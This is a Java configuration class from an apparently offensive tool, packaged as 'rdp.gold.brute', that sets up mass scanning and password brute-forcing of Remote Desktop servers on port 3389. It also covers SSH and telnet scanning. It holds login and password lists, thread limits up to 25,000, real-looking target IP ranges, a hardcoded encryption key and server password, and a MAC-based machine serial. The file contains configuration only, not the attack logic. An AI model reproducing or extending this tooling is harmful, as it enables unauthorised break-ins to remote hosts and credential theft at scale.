package rdp.gold.brute;

import java.io.File;
import java.io.StringWriter;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

@SuppressWarnings({ "unchecked", "rawtypes" })
public class Config {
    public static final String RDPSOCKET_VERSION = "0.3_3_4";
    public static final String SERIAL_NUMBER = null;
    public static final int PORT = 3389;
    public static final int SYNC_TIMEOUT_MS = 11000;
    public static final Pattern PATTERN_PORT_RANGE = Pattern.compile("^(\\d{1,5})-(\\d{1,5})$");
    public static final Pattern PATTERN_TASK_TYPE = Pattern.compile("\\[\\{task_type:(\\d+)\\}\\]");
    public static final int TYPE_AWAIT = 0;
    public static final int TYPE_RDP_SCAN = 1;
    public static final int TYPE_RDP_BRUTE = 2;
    public static final Pattern PATTERN_IS_RANGE = Pattern.compile("^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}) - (\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$");
    public static final Pattern PATTERN_IS_CIDR = Pattern.compile("^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\/\\d{1,3}$");
    public static final Pattern PATTERN_IP_PORT = Pattern.compile("^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}).*$");
    public static final Pattern PATTERN_IP_WITH_OR_WITHOUT_PORT = Pattern.compile("^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}(:\\d{1,5})?).*$");
    private static final Logger logger = Logger.getLogger(Config.class);
    public static UUID SERVER_IDENTIFICATOR = UUID.randomUUID();
    public static UUID PROJECT_ID = UUID.randomUUID();
    public static UUID CONFIG_ID = UUID.randomUUID();
    public static byte[] KEY_ENCRYPT = new String("BRUTEENCRYPTSYNC").getBytes();
    public static byte[] IV_ENCRYPT = new String("INITVENCRYPTSYNC").getBytes();
    public static String FILE_SERVER_PASSWORD = "XHr4jBYf5BV2Cd7zpzR9pEGn";
    public static boolean IS_WRITE_RESULT_TO_FILE = false;
    public static String WRITE_RESULT_TO_FILE = null;
    public static String HOST_ADMIN = "127.0.0.1";
    public static int PORT_ADMIN = 8333;
    public static Integer BRUTE_TIMEOUT_MS_SETTINGS_FILE;
    public static Integer SCAN_CONNECT_TIMEOUT_MS_SETTINGS_FILE;
    public static Integer SCAN_SOCKET_TIMEOUT_MS_SETTINGS_FILE;
    public static Integer BRUTE_THREADS_SETTINGS_FILE = Integer.valueOf(200);
    public static Integer SCAN_THREADS_SETTINGS_FILE = Integer.valueOf(2000);
    public static String PORT_SCAN = "3389";
    public static Integer SCAN_TYPE = Integer.valueOf(1);
    public static Integer SCAN_CNT_ATTEMPTS = Integer.valueOf(1);
    public static Boolean SCAN_IS_BRUTABLE = Boolean.valueOf(false);
    public static Boolean SCAN_SAVE_INVALID = Boolean.valueOf(false);
    public static String TEST_SERVER_START_IP = "210.200.0.0:3389";
    public static String TEST_SERVER_END_IP = "210.211.255.0:3389";
    public static Boolean IS_ENABLE_DEBUG = Boolean.valueOf(false);
    public static String LOG_PATH = ".";
    public static ArrayList<String> LOGINS = new ArrayList();
    public static ArrayList<String> PASSWORDS = new ArrayList();
    public static Map<Integer, String> TYPE_TASK_TEXT = new java.util.HashMap();
    public static AtomicBoolean IS_ENABLED_BRUTE = new AtomicBoolean(false);
    public static AtomicBoolean IS_ENABLED_SCAN = new AtomicBoolean(false);
    public static AtomicInteger TYPE_TASK = new AtomicInteger(0);
    public static AtomicBoolean IS_VALID_SERVER_SCAN = new AtomicBoolean(false);
    public static AtomicBoolean IS_VALID_SERVER_BRUTE = new AtomicBoolean(false);
    public static AtomicBoolean IS_TEST_SERVER_SCAN = new AtomicBoolean(false);
    public static AtomicBoolean IS_TEST_SERVER_BRUTE = new AtomicBoolean(false);
    public static Boolean AUTOCONFIGURE_THREADS = Boolean.valueOf(true);
    public static Integer AUTOCONFIGURE_THREADS_CORE = Integer.valueOf(150);
    public static Integer AUTOCONFIGURE_THREADS_LIMIT = Integer.valueOf(25000);
    public static Boolean BRUTE_MODE_CHECK_SINGLE_LOGIN_PASSWORD = Boolean.valueOf(false);
    public static Boolean BRUTE_IS_CHECK_IP = Boolean.valueOf(true);
    public static Integer BRUTE_CNT_ATTEMPTS = Integer.valueOf(1);
    public static Integer SCAN_CONNECT_TIMEOUT = Integer.valueOf(1000);
    public static Integer SCAN_SOCKET_TIMEOUT = Integer.valueOf(1000);
    public static Integer SCAN_THREADS = Integer.valueOf(1000);
    public static Integer BRUTE_TIMEOUT = Integer.valueOf(11000);
    public static Integer BRUTE_THREADS = Integer.valueOf(1000);
    public static Boolean BRUTE_IS_LOAD_SETTINGS_FROM_SERVER = Boolean.valueOf(false);
    public static Boolean SCAN_IS_LOAD_SETTINGS_FROM_SERVER = Boolean.valueOf(false);
    public static Integer CHECKER_EXPECT_IP_FOR_ENABLE_SCAN = Integer.valueOf(100);
    public static Integer CHECKER_EXPECT_BRUTABLE_IP_FOR_ENABLE_BRUTE = Integer.valueOf(80);
    public static Boolean BRUTE_IS_CHECK_ALL_COMBINATIONS = Boolean.valueOf(false);
    public static Boolean BRUTE_IS_SAVE_NOT_SUPPORT_IP = Boolean.valueOf(false);
    public static String JAR_PATH = "";
    public static Integer MAX_CNT_ATTEMPTS_DOWNLOAD_IP_LOGIN_PASSWORD_LIST = Integer.valueOf(25);
    public static rdp.gold.brute.constant.BruteforceMode BRUTEFORCE_MODE = rdp.gold.brute.constant.BruteforceMode.MODE_NONE;
    public static final int SCAN_TYPE_RDP = 1;

    static {
        try {
            JAR_PATH = new File(Config.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getParent();
            logger.error("JAR_PATH ---->   " + JAR_PATH);
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            logger.error(e + " " + sw);
            System.err.println(e.getMessage());
            e.printStackTrace();

            System.exit(1);
        }
    }

    public static final int SCAN_TYPE_SSH = 2;
    public static final int SCAN_TYPE_TELNET = 3;

    public static boolean hasTaskType(int taskType) {
        List<Integer> listTaskTypes = new ArrayList();
        listTaskTypes.add(Integer.valueOf(0));
        listTaskTypes.add(Integer.valueOf(1));
        listTaskTypes.add(Integer.valueOf(2));

        return listTaskTypes.contains(Integer.valueOf(taskType));
    }

    public static int getThreads() {
        int threads = 0;

        switch (TYPE_TASK.get()) {
        case 1:
            threads = SCAN_THREADS.intValue();
            break;
        case 2:
            threads = BRUTE_THREADS.intValue();
        }

        return threads;
    }

    public static String getSN() {
        StringBuilder sb = new StringBuilder();
        try {
            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(java.net.InetAddress.getLocalHost());
            byte[] hardwareAddress = networkInterface.getHardwareAddress();

            for (int i = 0; i < hardwareAddress.length; i++) {
                sb.append(String.format("%02X%s", new Object[] { Byte.valueOf(hardwareAddress[i]), i < hardwareAddress.length - 1 ? "-" : "" }));
            }
        } catch (Exception localException) {
        }

        return sb.toString();
    }

    public static void init() {
        TYPE_TASK_TEXT.put(Integer.valueOf(0), "await");
        TYPE_TASK_TEXT.put(Integer.valueOf(1), "scan");
        TYPE_TASK_TEXT.put(Integer.valueOf(2), "brute");
    }

    public static synchronized void runAutoconfigureThreads() {
        int cores = Runtime.getRuntime().availableProcessors();
        int bruteThreads = cores * AUTOCONFIGURE_THREADS_CORE.intValue();
        int scanThreads = cores * AUTOCONFIGURE_THREADS_CORE.intValue();

        BRUTE_THREADS = Integer.valueOf(bruteThreads > AUTOCONFIGURE_THREADS_LIMIT.intValue() ? AUTOCONFIGURE_THREADS_LIMIT.intValue() : bruteThreads);
        SCAN_THREADS = Integer.valueOf(scanThreads > AUTOCONFIGURE_THREADS_LIMIT.intValue() ? AUTOCONFIGURE_THREADS_LIMIT.intValue() : scanThreads);

        BRUTE_THREADS_SETTINGS_FILE = BRUTE_THREADS;
        SCAN_THREADS_SETTINGS_FILE = SCAN_THREADS;
    }
}
